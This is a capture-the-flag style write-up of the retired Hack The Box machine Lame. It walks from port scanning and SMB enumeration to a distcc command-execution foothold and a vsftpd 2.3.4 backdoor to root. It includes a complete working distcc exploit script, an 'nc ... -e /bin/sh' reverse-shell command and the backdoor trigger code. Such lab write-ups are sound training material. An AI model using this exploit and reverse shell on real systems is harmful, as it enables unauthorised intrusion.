# Lame — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🐧 Linux |
| **Difficulty** | 🟢 Easy |
| **Owned** | 07/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`HTB{__REDACTED__}`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Lame** exposes several end-of-life services. My path:

**Foothold** — distcc daemon command execution (**CVE-2004-2687**).
**Root** — vsftpd 2.3.4 backdoor (**CVE-2011-2523**).

**Attack path:** `distccd (CVE-2004-2687) → shell → vsftpd 2.3.4 backdoor (CVE-2011-2523) → root`

---

## 🔍 1. Reconnaissance

### Port scan

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

FTP details and host scripts:

```
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
|      Logged in as ftp
|      vsFTPd 2.3.4 - secure, fast, stable
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
|_  FQDN: lame.hackthebox.gr
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
```

**Target info**

- hostname: `lame.hackthebox.gr`
- TCP 21 — vsftpd 2.3.4, anonymous enabled
- TCP 139/445 — Samba 3.0.20-Debian
- TCP 3632 — distccd

---

## 🧭 2. Enumeration

### SMB (445)

```bash
smbclient -L //10.129.66.131/ -N            # list shares (null session)
smbclient //10.129.66.131/tmp -U "" -N       # connect to a share as guest
```

```
LAME  Wk Sv PrQ Unx NT SNT  lame server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03
```

### distcc (3632)

Confirmed exploitable with the Nmap NSE script:

```bash
sudo nmap -p3632 --script distcc-cve2004-2687 10.129.66.131
```

```
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Users found

```
man
tomcat55
postgres
user
```

---

## 🎯 3. Foothold — distcc (CVE-2004-2687)

Exploited manually with a standalone PoC (no Metasploit — OSCP style), ported from
ExploitDB #9915.

**1. Start a listener:**

```bash
penelope -p 1403        # or: nc -lvp 1403
```

**2. Fire the exploit with a reverse-shell command:**

```bash
./distccd_exploit.py -t 10.129.66.131 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"
```

<details>
<summary>📜 <code>distccd_exploit.py</code> (click to expand)</summary>

```python
# -*- coding: utf-8 -*-
'''
    distccd v1 RCE (CVE-2004-2687)

    Ported from a public Metasploit exploit:
        https://www.exploit-db.com/exploits/9915

    Goal: do it manually, without Metasploit. (OSCP style)

    Lame Box (HTB):
        local> nc -lvp 1403
        local> ./disccd_exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"

    Jean-Pierre LESUEUR (@DarkCoderSc)
'''
import socket, string, random, argparse

def rand_text_alphanumeric(length):
    s = ""
    for i in range(length):
        s += random.choice(string.ascii_letters + string.digits)
    return s

def read_std(s):
    s.recv(4)                       # Ignore
    length = int(s.recv(8), 16)     # Get output length
    if length != 0:
        return s.recv(length)

def exploit(command, host, port):
    args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]
    payload = "DIST00000001" + "ARGC%.8x" % len(args)
    for arg in args:
        payload += "ARGV%.8x%s" % (len(arg), arg)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(5)
    s.settimeout(5)

    if s.connect_ex((host, port)) == 0:
        print("[OK] Connected to remote service")
        try:
            s.send(payload.encode('utf-8'))
            dtag = "DOTI0000000A" + rand_text_alphanumeric(10)
            s.send(dtag.encode('utf-8'))
            s.recv(24)
            print("\n--- BEGIN BUFFER ---\n")
            buff = read_std(s)                    # STDERR
            if buff:
                print(buff)
            buff = read_std(s)                    # STDOUT
            if buff:
                print(buff)
            print("\n--- END BUFFER ---\n")
            print("[OK] Done.")
        except socket.timeout:
            print("[KO] Socket Timeout")
        except socket.error:
            print("[KO] Socket Error")
        except Exception as e:
            print(f"[KO] Exception Raised {e}")
        finally:
            s.close()
    else:
        print("[KO] Failed to connect to %s on port %d" % (host, port))

parser = argparse.ArgumentParser(description='DistCC Daemon - Command Execution (Metasploit)')
parser.add_argument('-t', action="store", dest="host", required=True, help="Target IP/HOST")
parser.add_argument('-p', action="store", type=int, dest="port", default=3632, help="DistCCd listening port")
parser.add_argument('-c', action="store", dest="command", default="id", help="Command to run on target system")

try:
    argv = parser.parse_args()
    exploit(argv.command, argv.host, argv.port)
except IOError:
    parser.error
```

</details>

---

## ⬆️ 4. Root — vsftpd 2.3.4 backdoor (CVE-2011-2523)

vsftpd 2.3.4 ships with a backdoor: sending a username ending in `:)` opens an
**unauthenticated** shell on TCP **6200**.

Trigger:

```python
user     = "USER nergal:)"
password = "PASS pass"

tn = Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)")   # if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.")        # if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")
```

Backdoor listens on port **6200** after the `:)` in the username (unauthenticated) → root.

---

## 🚩 Proof

```
user.txt: HTB{__REDACTED__}
root.txt: HTB{__REDACTED__}
```

---

## 🧰 Tools & tips used

- [**Penelope**](https://github.com/brightio/penelope) — shell handler / listener (`penelope -p <port>`).
- **SMB guest / null session:** `smbclient //<IP>/<share> -U "" -N`.

---

## 🔗 References

- [CVE-2004-2687 — distcc daemon command execution](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [CVE-2011-2523 — vsftpd 2.3.4 backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [ExploitDB #9915 — distccd RCE](https://www.exploit-db.com/exploits/9915)
- [distcc PoC gist (DarkCoderSc)](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)
